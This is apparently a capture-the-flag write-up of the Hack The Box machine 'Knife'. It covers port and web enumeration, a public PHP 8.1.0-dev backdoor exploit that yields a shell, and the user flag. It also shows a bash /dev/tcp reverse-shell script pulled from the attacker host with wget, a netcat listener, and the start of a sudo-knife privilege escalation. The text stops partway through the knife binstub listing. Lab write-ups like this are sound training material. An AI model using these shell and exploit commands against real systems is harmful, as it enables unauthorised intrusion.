# Introduction

[![Knife](https://www.hackthebox.eu/storage/avatars/110fe6608793064cf171080150ebd0dc.png)](https://app.hackthebox.eu/machines/347)

| Point | Description |
| :------:| :------: |
| Name | Knife |
| OS   | Linux  |
| Difficulty Rating| Easy   |
| Release | 22 May 2021   |
| IP | 10.10.10.242   |
| Owned | 31 May 2021 |

# Short retelling

* Find vulearable service
* Get user.txt
* Exec shell with using bin knife
* Get root.txt

# Enumeration

## Nmap

Recon host 10.10.10.242 with nmap. Add knife.htb to /etc/hosts

```
┌──(root💀kali)-[/home/kali/HTB/knife]
└─# nmap -sV -A -p- --min-rate 5000 10.10.10.242                                                                                                                                                                                     130 ⨯
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-01 21:40 EDT
Nmap scan report for knife.htb (10.10.10.242)
Host is up (0.13s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 (RSA)
|   256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee (ECDSA)
|_  256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title:  Emergent Medical Idea
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=6/1%OT=22%CT=1%CU=35740%PV=Y%DS=2%DC=T%G=Y%TM=60B6E1CC
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A)OPS(
OS:O1=M54BST11NW7%O2=M54BST11NW7%O3=M54BNNT11NW7%O4=M54BST11NW7%O5=M54BST11
OS:NW7%O6=M54BST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(
OS:R=Y%DF=Y%T=40%W=FAF0%O=M54BNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=
OS:S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 554/tcp)
HOP RTT       ADDRESS
1   205.68 ms 10.10.16.1
2   94.97 ms  knife.htb (10.10.10.242)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 43.91 seconds
```

Ports 80 and 22 are open

Let's check http://knife.htb

![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/k1.PNG)

And we see just one page without links.

## ffuf

Let's enumerate directories and sub domains

```
┌──(root💀kali)-[/home/kali/HTB/knife]
└─# ffuf -w /usr/share/SecLists/Discovery/Web-Content/big.txt -u http://knife.htb/FUZZ -e php,txt,htm,html,phtml,js,zip,rar,tar -t 100

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.0-git
________________________________________________

 :: Method           : GET
 :: URL              : http://knife.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/SecLists/Discovery/Web-Content/big.txt
 :: Extensions       : php txt htm html phtml js zip rar tar 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 100
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

.htaccess               [Status: 403, Size: 274, Words: 20, Lines: 10]
.htaccessphp            [Status: 403, Size: 274, Words: 20, Lines: 10]
.htaccesszip            [Status: 403, Size: 274, Words: 20, Lines: 10]
.htaccessjs             [Status: 403, Size: 274, Words: 20, Lines: 10]
.htaccessphtml          [Status: 403, Size: 274, Words: 20, Lines: 10]
.htaccesshtm            [Status: 403, Size: 274, Words: 20, Lines: 10]
.htaccesstxt            [Status: 403, Size: 274, Words: 20, Lines: 10]
.htaccesshtml           [Status: 403, Size: 274, Words: 20, Lines: 10]
.htaccessrar            [Status: 403, Size: 274, Words: 20, Lines: 10]
.htaccesstar            [Status: 403, Size: 274, Words: 20, Lines: 10]
.htpasswdphp            [Status: 403, Size: 274, Words: 20, Lines: 10]
.htpasswd               [Status: 403, Size: 274, Words: 20, Lines: 10]
.htpasswdtxt            [Status: 403, Size: 274, Words: 20, Lines: 10]
.htpasswdhtm            [Status: 403, Size: 274, Words: 20, Lines: 10]
.htpasswdphtml          [Status: 403, Size: 274, Words: 20, Lines: 10]
.htpasswdhtml           [Status: 403, Size: 274, Words: 20, Lines: 10]
.htpasswdjs             [Status: 403, Size: 274, Words: 20, Lines: 10]
.htpasswdzip            [Status: 403, Size: 274, Words: 20, Lines: 10]
.htpasswdrar            [Status: 403, Size: 274, Words: 20, Lines: 10]
.htpasswdtar            [Status: 403, Size: 274, Words: 20, Lines: 10]
server-status           [Status: 403, Size: 274, Words: 20, Lines: 10]
:: Progress: [204750/204750] :: Job [1/1] :: 818 req/sec :: Duration: [0:03:57] :: Errors: 0 ::
```

And no results, let's check subdomains

```
┌──(root💀kali)-[/home/kali/HTB/knife]
└─# ffuf -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -u http://knife.htb/ -H "Host:FUZZ.knife.htb" -fw 646

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.0-git
________________________________________________

 :: Method           : GET
 :: URL              : http://knife.htb/
 :: Wordlist         : FUZZ: /usr/share/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.knife.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response words: 646
________________________________________________

:: Progress: [114441/114441] :: Job [1/1] :: 387 req/sec :: Duration: [0:05:30] :: Errors: 0 ::
```

Ok still no info... Checking source code and don't get result too...

## CMSmap

Let's check what cms is used

```
┌──(root💀kali)-[/home/kali/HTB/knife/CMSmap]
└─# python3 cmsmap.py http://knife.htb/        
[-] Date & Time: 01/06/2021 23:03:28
[-] wordpress git repo has not been found. Cloning...
Cloning into '/home/kali/HTB/knife/CMSmap/cmsmap/tmp/wordpress'...
remote: Enumerating objects: 351622, done.
remote: Counting objects: 100% (3062/3062), done.
remote: Compressing objects: 100% (1059/1059), done.
remote: Total 351622 (delta 2113), reused 2867 (delta 1966), pack-reused 348560
Receiving objects: 100% (351622/351622), 285.12 MiB | 979.00 KiB/s, done.
Resolving deltas: 100% (283305/283305), done.
Updating files: 100% (3032/3032), done.
[-] joomla git repo has not been found. Cloning...
Cloning into '/home/kali/HTB/knife/CMSmap/cmsmap/tmp/joomla'...
fatal: unable to access 'https://github.com/joomla/joomla-cms/': Operation timed out after 300009 milliseconds with 0 out of 0 bytes received
[-] drupal git repo has not been found. Cloning...
Cloning into '/home/kali/HTB/knife/CMSmap/cmsmap/tmp/drupal'...
remote: Enumerating objects: 804728, done.
remote: Counting objects: 100% (10964/10964), done.
remote: Compressing objects: 100% (6556/6556), done.
remote: Total 804728 (delta 5483), reused 8128 (delta 4094), pack-reused 793764
Receiving objects: 100% (804728/804728), 242.07 MiB | 1.18 MiB/s, done.
Resolving deltas: 100% (561329/561329), done.
Updating files: 100% (16445/16445), done.
[-] moodle git repo has not been found. Cloning...
Cloning into '/home/kali/HTB/knife/CMSmap/cmsmap/tmp/moodle'...
remote: Enumerating objects: 1229106, done.
remote: Counting objects: 100% (4/4), done.
remote: Compressing objects: 100% (4/4), done.
remote: Total 1229106 (delta 0), reused 0 (delta 0), pack-reused 1229102
Receiving objects: 100% (1229106/1229106), 554.99 MiB | 1.47 MiB/s, done.
Resolving deltas: 100% (869202/869202), done.
Updating files: 100% (22118/22118), done.
[-] Updating wordpress versions
[-] Updating joomla versions
fatal: cannot change to '/home/kali/HTB/knife/CMSmap/cmsmap/tmp/joomla': No such file or directory
[-] Updating drupal versions
[-] Updating moodle versions
[-] Updating wordpress default files
[-] Updating wordpress default folders
[-] Updating joomla default files
find: ‘/home/kali/HTB/knife/CMSmap/cmsmap/tmp/joomla’: No such file or directory
[-] Updating joomla default folders
find: ‘/home/kali/HTB/knife/CMSmap/cmsmap/tmp/joomla’: No such file or directory
[-] Updating drupal default files
[-] Updating drupal default folders
[-] Updating moodle default files
[-] Updating moodle default folders
[I] Threads: 5
[-] Target: http://knife.htb (10.10.10.242)
[M] Website Not in HTTPS: http://knife.htb
[L] X-Frame-Options: Not Enforced
[I] Strict-Transport-Security: Not Enforced
[I] X-Content-Security-Policy: Not Enforced
[I] X-Content-Type-Options: Not Enforced
[L] No Robots.txt Found
[ERROR] CMS detection failed :(
[ERROR] Use -f to force CMSmap to scan (W)ordpress, (J)oomla or (D)rupal
```

And no results too.

## nikto

Let's run web scanner to find something

```
┌──(root💀kali)-[/home/kali/HTB/knife/CMSmap]
└─# nikto --url http://knife.htb/
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.10.242
+ Target Hostname:    knife.htb
+ Target Port:        80
+ Start Time:         2021-06-02 00:42:29 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.41 (Ubuntu)
+ Retrieved x-powered-by header: PHP/8.1.0-dev
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ 7786 requests: 0 error(s) and 5 item(s) reported on remote host
+ End Time:           2021-06-02 00:56:19 (GMT-4) (830 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested


      *********************************************************************
      Portions of the server's headers (Apache/2.4.41) are not in
      the Nikto 2.1.6 database or are newer than the known string. Would you like
      to submit this information (*no server specific data*) to CIRT.net
      for a Nikto update (or you may email to sullo@cirt.net) (y/n)? y

+ The site uses SSL and the Strict-Transport-Security HTTP header is not defined.
+ ERROR:  -> 
+ ERROR: Update failed, please notify sullo@cirt.net of the previous line.
```

## whatweb

Ok we have nothing, so try to find exolits for verion of services apache, openssh and php.

```
──(root💀kali)-[/home/kali/HTB/knife]
└─# whatweb http://knife.htb/
http://knife.htb/ [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.10.242], PHP[8.1.0-dev], Script, Title[Emergent Medical Idea], X-Powered-By[PHP/8.1.0-dev]
```

Use google and we find the [article](https://flast101.github.io/php-8.1.0-dev-backdoor-rce/) about exploit for srvice *PHP/8.1.0-dev*

* [PHP 8.1.0-dev Backdoor Remote Code Execution](https://github.com/flast101/php-8.1.0-dev-backdoor-rce)

# Explotation

Download exploit and we get rce from user james

```
┌──(root💀kali)-[/home/kali/HTB/knife]
└─# python3 backdoor_php_8.1.0-dev.py 
Enter the host url:
http://knife.htb/

Interactive shell is opened on http://knife.htb/ 
Can't acces tty; job crontol turned off.
$ id
uid=1000(james) gid=1000(james) groups=1000(james)
```

And get **user.txt** fast

```
$ ls /home/james
user.txt

$ cat /home/james/user.txt
94afe29bfc6c076baa8ac7bbbe97bfe7

```

# Privilege Escalation

We need to upgrade shell to get privilelege escalation.

Let's upload nash reverse shell to the host

Reverse shell:

```
┌──(root💀kali)-[/home/kali/HTB/knife]
└─# ip a | grep tun
5: tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 500
    inet 10.10.16.4/22 scope global tun0
                                                                                                                                                                                                                                           
┌──(root💀kali)-[/home/kali/HTB/knife]
└─# cat pasha.sh 
bash -i >& /dev/tcp/10.10.16.4/5555 0>&1
```
Run http server and download reverse shell

```
$ wget http://10.10.16.4:8000/pasha.sh -O /tmp/pasha.sh

$ ls /tmp
bundler
hsperfdata_opscode
pasha.sh
snap.lxd
systemd-private-d3ba484081d24cc283e4fc7aa9b8c8b1-apache2.service-Xm2nli
systemd-private-d3ba484081d24cc283e4fc7aa9b8c8b1-systemd-logind.service-MeT3Xe
systemd-private-d3ba484081d24cc283e4fc7aa9b8c8b1-systemd-resolved.service-mHnYUf
systemd-private-d3ba484081d24cc283e4fc7aa9b8c8b1-systemd-timesyncd.service-20HZnj
vmware-root_722-2966037965
```

Start listener and run shell and we get reverse shell

```
┌──(root💀kali)-[/home/kali/HTB/knife]
└─# nc -lvp 5555 
listening on [any] 5555 ...
connect to [10.10.16.4] from knife.htb [10.10.10.242] 51254
bash: cannot set terminal process group (956): Inappropriate ioctl for device
bash: no job control in this shell
james@knife:/$ 
```

At first upgrade reverse shell and dowload linpeas.sh

```
james@knife:/$ python3 -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
james@knife:/$ cd /tmp
cd /tmp
james@knife:/tmp$ wget http://10.10.16.4:8000/linpeas.sh
wget http://10.10.16.4:8000/linpeas.sh
--2021-06-02 05:32:42--  http://10.10.16.4:8000/linpeas.sh
Connecting to 10.10.16.4:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 325975 (318K) [text/x-sh]
Saving to: ‘linpeas.sh’

linpeas.sh          100%[===================>] 318.33K   307KB/s    in 1.0s    

2021-06-02 05:32:44 (307 KB/s) - ‘linpeas.sh’ saved [325975/325975]

james@knife:/tmp$ ls
ls
bundler
hsperfdata_opscode
linpeas.sh
pasha.sh
snap.lxd
systemd-private-d3ba484081d24cc283e4fc7aa9b8c8b1-apache2.service-Xm2nli
systemd-private-d3ba484081d24cc283e4fc7aa9b8c8b1-systemd-logind.service-MeT3Xe
systemd-private-d3ba484081d24cc283e4fc7aa9b8c8b1-systemd-resolved.service-mHnYUf
systemd-private-d3ba484081d24cc283e4fc7aa9b8c8b1-systemd-timesyncd.service-20HZnj
vmware-root_722-2966037965
```

Run linpeas.. In the report we find

```
[+] Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid                                                                                                                                                              
Matching Defaults entries for james on knife:                                                                                                                                                                                              
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on knife:
    (root) NOPASSWD: /usr/bin/knife
```

We can run application *knife* from root without password

What is [knife](https://docs.chef.io/workstation/knife/)?

>Knife is a command-line tool that provides an interface between a local chef-repo and the Chef Infra Server. knife helps users to manage.

Let's check source code of knife

```
james@knife:/$ cat /usr/bin/knife
cat /usr/bin/knife
#!/opt/chef-workstation/embedded/bin/ruby --disable-gems
#--APP_BUNDLER_BINSTUB_FORMAT_VERSION=1--
require "rubygems"

begin
  # this works around rubygems/rubygems#2196 and can be removed in rubygems > 2.7.6
  require "rubygems/bundler_version_finder"
rescue LoadError
  # probably means rubygems is too old or too new to have this class, and we don't care
end

# avoid appbundling if we are definitely running within a Bundler bundle.
# most likely the check for defined?(Bundler) is enough since we don't require
# bundler above, but just for paranoia's sake also we test to see if Bundler is
# really doing its thing or not.
unless defined?(Bundler) && Bundler.instance_variable_defined?("@load")
  ENV["GEM_HOME"] = ENV["GEM_PATH"] = nil unless ENV["APPBUNDLER_ALLOW_RVM"] == "true"
  ::Gem.clear_paths

  gem "activesupport", "= 5.2.4.5"
  gem "addressable", "= 2.7.0"
  gem "appbundler", "= 0.13.2"
  gem "artifactory", "= 3.0.15"
  gem "ast", "= 2.4.2"
  gem "aws-eventstream", "= 1.1.0"
  gem "aws-partitions", "= 1.427.0"
  gem "aws-sdk-apigateway", "= 1.59.0"
  gem "aws-sdk-apigatewayv2", "= 1.31.0"
  gem "aws-sdk-applicationautoscaling", "= 1.49.0"
  gem "aws-sdk-athena", "= 1.35.0"
  gem "aws-sdk-autoscaling", "= 1.53.0"
  gem "aws-sdk-batch", "= 1.43.0"
  gem "aws-sdk-budgets", "= 1.37.0"
  gem "aws-sdk-cloudformation", "= 1.47.0"
  gem "aws-sdk-cloudfront", "= 1.48.0"
  gem "aws-sdk-cloudhsm", "= 1.28.0"
  gem "aws-sdk-cloudhsmv2", "= 1.32.0"
  gem "aws-sdk-cloudtrail", "= 1.33.0"
  gem "aws-sdk-cloudwatch", "= 1.49.0"
  gem "aws-sdk-cloudwatchevents", "= 1.40.0"
  gem "aws-sdk-cloudwatchlogs", "= 1.39.0"
  gem "aws-sdk-codecommit", "= 1.41.0"
  gem "aws-sdk-codedeploy", "= 1.38.0"
  gem "aws-sdk-codepipeline", "= 1.41.0"
  gem "aws-sdk-cognitoidentity", "= 1.29.0"
  gem "aws-sdk-cognitoidentityprovider", "= 1.48.0"
  gem "aws-sdk-configservice", "= 1.57.0"
  gem "aws-sdk-core", "= 3.112.0"
  gem "aws-sdk-costandusagereportservice", "= 1.29.0"
  gem "aws-sdk-databasemigrationservice", "= 1.50.0"
  gem "aws-sdk-dynamodb", "= 1.59.0"
  gem "aws-sdk-ec2", "= 1.224.0"
  gem "aws-sdk-ecr", "= 1.41.0"
  gem "aws-sdk-ecs", "= 1.74.0"
  gem "aws-sdk-efs", "= 1.37.0"
  gem "aws-sdk-eks", "= 1.48.0"
  gem "aws-sdk-elasticache", "= 1.53.0"
  gem "aws-sdk-elasticbeanstalk", "= 1.41.0"
  gem "aws-sdk-elasticloadbalancing", "= 1.30.0"
  gem "aws-sdk-elasticloadbalancingv2", "= 1.60.0"
  gem "aws-sdk-elasticsearchservice", "= 1.48.0"
  gem "aws-sdk-firehose", "= 1.36.0"
  gem "aws-sdk-glue", "= 1.82.0"
  gem "aws-sdk-guardduty", "= 1.44.0"
  gem "aws-sdk-iam", "= 1.48.0"
  gem "aws-sdk-kafka", "= 1.34.0"
  gem "aws-sdk-kinesis", "= 1.31.0"
  gem "aws-sdk-kms", "= 1.42.0"
  gem "aws-sdk-lambda", "= 1.59.0"
  gem "aws-sdk-organizations", "= 1.55.0"
  gem "aws-sdk-ram", "= 1.22.0"
  gem "aws-sdk-rds", "= 1.114.0"
  gem "aws-sdk-redshift", "= 1.54.0"
  gem "aws-sdk-route53", "= 1.46.0"
  gem "aws-sdk-route53domains", "= 1.29.0"
  gem "aws-sdk-route53resolver", "= 1.23.0"
  gem "aws-sdk-s3", "= 1.88.1"
  gem "aws-sdk-secretsmanager", "= 1.43.0"
  gem "aws-sdk-securityhub", "= 1.40.0"
  gem "aws-sdk-servicecatalog", "= 1.57.0"
  gem "aws-sdk-ses", "= 1.37.0"
  gem "aws-sdk-shield", "= 1.34.0"
  gem "aws-sdk-sms", "= 1.28.0"
  gem "aws-sdk-sns", "= 1.38.0"
  gem "aws-sdk-sqs", "= 1.36.0"
  gem "aws-sdk-ssm", "= 1.104.0"
  gem "aws-sdk-states", "= 1.37.0"
  gem "aws-sdk-transfer", "= 1.29.0"
  gem "aws-sigv4", "= 1.2.2"
  gem "axiom-types", "= 0.1.1"
  gem "azure_graph_rbac", "= 0.17.2"
  gem "azure_mgmt_compute", "= 0.21.1"
  gem "azure_mgmt_key_vault", "= 0.17.7"
  gem "azure_mgmt_network", "= 0.26.0"
  gem "azure_mgmt_resources", "= 0.18.1"
  gem "azure_mgmt_security", "= 0.19.0"
  gem "azure_mgmt_storage", "= 0.22.0"
  gem "bcrypt_pbkdf", "= 1.1.0.rc2"
  gem "bcrypt_pbkdf", "= 1.1.0.rc2"
  gem "bcrypt_pbkdf", "= 1.1.0.rc2"
  gem "berkshelf", "= 7.2.0"
  gem "binding_of_caller", "= 1.0.0"
  gem "builder", "= 3.2.4"
  gem "byebug", "= 11.1.3"
  gem "chef", "= 16.10.8"
  gem "chef", "= 16.10.8"
  gem "chef-apply", "= 0.5.3"
  gem "chef-bin", "= 16.10.8"
  gem "chef-cli", "= 3.1.1"
  gem "chef-config", "= 16.10.8"
  gem "chef-telemetry", "= 1.0.14"
  gem "chef-utils", "= 16.10.8"
  gem "chef-vault", "= 4.1.0"
  gem "chef-zero", "= 15.0.4"
  gem "chef_deprecations", "= 0.1.2"
  gem "cheffish", "= 16.0.12"
  gem "chefspec", "= 9.2.1"
  gem "chefstyle", "= 1.7.1"
  gem "citrus", "= 3.0.2"
  gem "cleanroom", "= 1.0.0"
  gem "coderay", "= 1.1.3"
  gem "coercible", "= 1.0.0"
  gem "concurrent-ruby", "= 1.1.8"
  gem "cookbook-omnifetch", "= 0.11.1"
  gem "cookstyle", "= 7.8.0"
  gem "debug_inspector", "= 1.0.0"
  gem "declarative", "= 0.0.20"
  gem "declarative-option", "= 0.1.0"
  gem "dep-selector-libgecode", "= 1.3.5"
  gem "dep_selector", "= 1.0.6"
  gem "descendants_tracker", "= 0.0.4"
  gem "diff-lcs", "= 1.3"
  gem "docker-api", "= 2.0.0"
  gem "domain_name", "= 0.5.20190701"
  gem "droplet_kit", "= 3.13.0"
  gem "ed25519", "= 1.2.4"
  gem "equalizer", "= 0.0.11"
  gem "erubi", "= 1.10.0"
  gem "erubis", "= 2.7.0"
  gem "excon", "= 0.79.0"
  gem "faraday", "= 1.3.0"
  gem "faraday-cookie_jar", "= 0.0.7"
  gem "faraday-net_http", "= 1.0.1"
  gem "faraday_middleware", "= 1.0.0"
  gem "fauxhai-ng", "= 8.7.0"
  gem "ffi", "= 1.14.2"
  gem "ffi", "= 1.14.2"
  gem "ffi", "= 1.14.2"
  gem "ffi-libarchive", "= 1.0.17"
  gem "ffi-yajl", "= 2.3.4"
  gem "filesize", "= 0.2.0"
  gem "fog-core", "= 2.2.3"
  gem "fog-json", "= 1.2.0"
  gem "fog-openstack", "= 1.0.11"
  gem "formatador", "= 0.2.5"
  gem "fuzzyurl", "= 0.9.0"
  gem "gcewinpass", "= 1.1.0"
  gem "google-api-client", "= 0.42.2"
  gem "googleauth", "= 0.14.0"
  gem "gssapi", "= 1.3.1"
  gem "guard", "= 2.16.2"
  gem "gyoku", "= 1.3.1"
  gem "hashie", "= 4.1.0"
  gem "highline", "= 2.0.3"
  gem "http-cookie", "= 1.0.3"
  gem "httpclient", "= 2.8.3"
  gem "i18n", "= 1.8.9"
  gem "ice_nine", "= 0.11.2"
  gem "inifile", "= 3.0.0"
  gem "iniparse", "= 1.5.0"
  gem "inspec", "= 4.26.4"
  gem "inspec-bin", "= 4.26.4"
  gem "inspec-core", "= 4.26.4"
  gem "ipaddress", "= 0.8.3"
  gem "jmespath", "= 1.4.0"
  gem "json", "= 2.5.1"
  gem "jwt", "= 2.2.2"
  gem "kartograph", "= 0.2.8"
  gem "kitchen-azurerm", "= 1.5.0"
  gem "kitchen-digitalocean", "= 0.11.2"
  gem "kitchen-dokken", "= 2.11.2"
  gem "kitchen-ec2", "= 3.8.0"
  gem "kitchen-google", "= 2.2.0"
  gem "kitchen-hyperv", "= 0.5.5"
  gem "kitchen-inspec", "= 2.3.0"
  gem "kitchen-openstack", "= 5.0.1"
  gem "kitchen-vagrant", "= 1.8.0"
  gem "kitchen-vcenter", "= 2.9.8"
  gem "knife-azure", "= 3.0.6"
  gem "knife-cloud", "= 4.0.15"
  gem "knife-ec2", "= 2.1.3"
  gem "knife-google", "= 5.0.8"
  gem "knife-opc", "= 0.4.7"
  gem "knife-tidy", "= 2.1.2"
  gem "knife-vcenter", "= 5.0.5"
  gem "knife-vsphere", "= 4.1.7"
  gem "knife-windows", "= 4.0.6"
  gem "kramdown", "= 2.3.0"
  gem "kramdown-parser-gfm", "= 1.1.0"
  gem "libyajl2", "= 1.2.0"
  gem "license-acceptance", "= 2.1.13"
  gem "listen", "= 3.4.1"
  gem "little-plugger", "= 1.1.4"
  gem "lockfile", "= 2.1.3"
  gem "logging", "= 2.3.0"
  gem "lumberjack", "= 1.2.8"
  gem "mdl", "= 0.11.0"
  gem "memoist", "= 0.16.2"
  gem "method_source", "= 1.0.0"
  gem "mime-types", "= 3.3.1"
  gem "mime-types-data", "= 3.2021.0212"
  gem "mini_mime", "= 1.0.2"
  gem "mini_portile2", "= 2.4.0"
  gem "minitar", "= 0.9"
  gem "minitest", "= 5.13.0"
  gem "mixlib-archive", "= 1.1.4"
  gem "mixlib-archive", "= 1.1.4"
  gem "mixlib-authentication", "= 3.0.7"
  gem "mixlib-cli", "= 2.1.8"
  gem "mixlib-config", "= 3.0.9"
  gem "mixlib-install", "= 3.12.5"
  gem "mixlib-log", "= 3.0.9"
  gem "mixlib-shellout", "= 3.2.5"
  gem "mixlib-shellout", "= 3.2.5"
  gem "mixlib-versioning", "= 1.2.12"
  gem "molinillo", "= 0.7.0"
  gem "ms_rest", "= 0.7.6"
  gem "ms_rest_azure", "= 0.12.0"
  gem "multi_json", "= 1.15.0"
  gem "multipart-post", "= 2.1.1"
  gem "nenv", "= 0.3.0"
  gem "net-ping", "= 2.0.8"
  gem "net-scp", "= 3.0.0"
  gem "net-sftp", "= 3.0.0"
  gem "net-ssh", "= 6.1.0"
  gem "net-ssh-gateway", "= 2.0.0"
  gem "net-ssh-multi", "= 1.2.1"
  gem "netaddr", "= 1.5.1"
  gem "nokogiri", "= 1.10.10"
  gem "nokogiri", "= 1.10.10"
  gem "nokogiri", "= 1.10.10"
  gem "nori", "= 2.6.0"
  gem "notiffany", "= 0.1.3"
  gem "octokit", "= 4.20.0"
  gem "ohai", "= 16.10.6"
  gem "optimist", "= 3.0.1"
  gem "os", "= 1.1.1"
  gem "parallel", "= 1.20.1"
  gem "parser", "= 3.0.0.0"
  gem "parslet", "= 1.8.2"
  gem "pastel", "= 0.8.0"
  gem "plist", "= 3.6.0"
  gem "proxifier", "= 1.0.3"
  gem "pry", "= 0.13.1"
  gem "pry-byebug", "= 3.9.0"
  gem "pry-remote", "= 0.1.8"
  gem "pry-stack_explorer", "= 0.6.1"
  gem "public_suffix", "= 4.0.6"
  gem "r18n-core", "= 4.0.0"
  gem "r18n-desktop", "= 4.0.0"
  gem "rack", "= 2.2.3"
  gem "rainbow", "= 3.0.0"
  gem "rake", "= 13.0.1"
  gem "rb-fsevent", "= 0.10.4"
  gem "rb-inotify", "= 0.10.1"
  gem "rb-readline", "= 0.5.5"
  gem "rbvmomi", "= 3.0.0"
  gem "regexp_parser", "= 2.0.3"
  gem "representable", "= 3.0.4"
  gem "resource_kit", "= 0.1.7"
  gem "retriable", "= 3.1.2"
  gem "retryable", "= 3.0.5"
  gem "rexml", "= 3.2.4"
  gem "rspec", "= 3.10.0"
  gem "rspec-core", "= 3.10.1"
  gem "rspec-expectations", "= 3.10.1"
  gem "rspec-its", "= 1.3.0"
  gem "rspec-mocks", "= 3.10.2"
  gem "rspec-support", "= 3.10.2"
  gem "rubocop", "= 1.10.0"
  gem "rubocop-ast", "= 1.4.1"
  gem "ruby-progressbar", "= 1.11.0"
  gem "ruby-shadow", "= 2.5.0"
  gem "ruby2_keywords", "= 0.0.4"
  gem "rubyntlm", "= 0.6.3"
  gem "rubyzip", "= 2.3.0"
  gem "sawyer", "= 0.8.2"
  gem "semverse", "= 3.0.0"
  gem "shellany", "= 0.0.1"
  gem "signet", "= 0.14.1"
  gem "slop", "= 3.6.0"
  gem "solve", "= 4.0.4"
  gem "sshkey", "= 2.0.0"
  gem "sslshake", "= 1.3.1"
  gem "strings", "= 0.2.0"
  gem "strings-ansi", "= 0.2.0"
  gem "syslog-logger", "= 1.6.8"
  gem "test-kitchen", "= 2.10.0"
  gem "thor", "= 1.1.0"
  gem "thread_safe", "= 0.3.6"
  gem "timeliness", "= 0.3.10"
  gem "toml-rb", "= 2.0.1"
  gem "tomlrb", "= 1.3.0"
  gem "train", "= 3.4.9"
  gem "train-aws", "= 0.1.35"
  gem "train-core", "= 3.4.9"
  gem "train-habitat", "= 0.2.22"
  gem "train-winrm", "= 0.2.12"
  gem "tty-box", "= 0.7.0"
  gem "tty-color", "= 0.6.0"
  gem "tty-cursor", "= 0.7.1"
  gem "tty-prompt", "= 0.23.0"
  gem "tty-reader", "= 0.9.0"
  gem "tty-screen", "= 0.8.1"
  gem "tty-spinner", "= 0.9.3"
  gem "tty-table", "= 0.12.0"
  gem "tzinfo", "= 1.2.9"
  gem "uber", "= 0.1.0"
  gem "unf", "= 0.1.4"
  gem "unf_ext", "= 0.0.7.7"
  gem "unf_ext", "= 0.0.7.7"
  gem "unf_ext", "= 0.0.7.7"
  gem "unicode-display_width", "= 1.7.0"
  gem "unicode_utils", "= 1.4.0"
  gem "uuidtools", "= 2.2.0"
  gem "virtus", "= 1.0.5"
